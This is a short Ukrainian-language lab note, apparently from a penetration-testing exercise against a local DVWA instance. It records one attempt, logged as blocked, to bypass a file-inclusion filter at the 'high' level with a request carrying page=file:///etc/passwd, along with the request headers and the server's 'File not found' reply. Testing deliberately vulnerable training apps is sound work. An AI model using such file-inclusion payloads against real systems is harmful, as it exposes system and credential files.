@@ -1,0 +1,16 @@
+# V6. Обхід fnmatch('file*') через file://
+
+Рівень безпеки DVWA: high
+
+Результат: заблоковано (HTTP 200)
+
+
+
+### GET ?page=file:///etc/passwd
+>>> GET http://127.0.0.1:8081/vulnerabilities/fi/?page=file%3A%2F%2F%2Fetc%2Fpasswd
+>>> Cookie: security=high; PHPSESSID=5d4ff67d88b2fe97177033cb6f753f50
+<<< HTTP 200 OK
+<<< Content-Type: text/html; charset=UTF-8
+<<< Content-Length: 22
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+ERROR: File not found!
